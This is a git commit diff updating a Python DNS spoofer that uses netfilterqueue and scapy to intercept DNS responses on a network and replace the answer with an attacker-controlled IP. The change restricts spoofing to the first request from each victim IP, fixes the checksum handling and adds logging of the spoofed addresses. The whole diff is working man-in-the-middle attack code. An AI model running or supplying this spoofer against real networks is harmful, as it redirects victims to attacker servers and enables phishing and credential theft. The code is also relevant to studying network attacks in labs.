a89018e68902735e1502031e78c3c9e2a9900db5
Hambihambi <134943206+Hambihambi@users.noreply.github.com>
2025-09-30 00:35:39 +0300

    Update dns_spoof.py
    Bugfixes, implemented spoofing only the first request of each IP, added a try - except block to print messages on starting and quitting.

--- DNS_spoofer/dns_spoof.py
+++ DNS_spoofer/dns_spoof.py
@@ -3,13 +3,17 @@
 import netfilterqueue
 import scapy.all as scapy
 
+spoofed_ips = set()
+
 def process_packet(packet):
     # convert the NetFilter packet to a scapy packet
     scapy_packet = scapy.IP(packet.get_payload())
+    src_ip = scapy_packet.src
     # check if the request has a DNS Resource Record and a qname in a DNS Question Record (containing the requested URL)
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if qname:
+        # spoof only for first site request per IP
+        if src_ip not in spoofed_ips:
             # forge the Response and inject it
             # replace with your webserver's IP
             answer = scapy.DNSRR(rrname=qname, rdata="1.2.3.4")
@@ -23,18 +27,28 @@ def process_packet(packet):
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
-            del scapy_packet[scapy.TCP].len
-            del scapy_packet[scapy.TCP].chksum
+            if scapy_packet.haslayer(scapy.TCP):
+                del scapy_packet[scapy.TCP].len
+                del scapy_packet[scapy.TCP].chksum
 
             #reconvert the scapy packet
             packet.set_payload(bytes(scapy_packet))
-
-            print(f"[+] Spoofing target: {qname}\n")
+            spoofed_ips.add(src_ip)
+            print(f"\n[+] Spoofed first request of {src_ip} for {qname}")
+        else:
+            print(f"\n[+] Accepted unmodified request from {src_ip} for {qname}")
     
-    # .drop or .access the packet
+    # .drop or .accept the packet
     packet.accept()
 
 # create the object, bind to the iptables command and run
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(1337, process_packet)
-queue.run()
+try:
+    print("[*] Starting packet interception. Press Ctrl+C to stop.")
+    queue.run()
+except KeyboardInterrupt:
+    print("\n[!] Keyboard Interrupt detected. Exiting gracefully.")
+    print("\n[*] Spoofed IP addresses:")
+    for ip in spoofed_ips:
+        print(f"\n - {ip}")
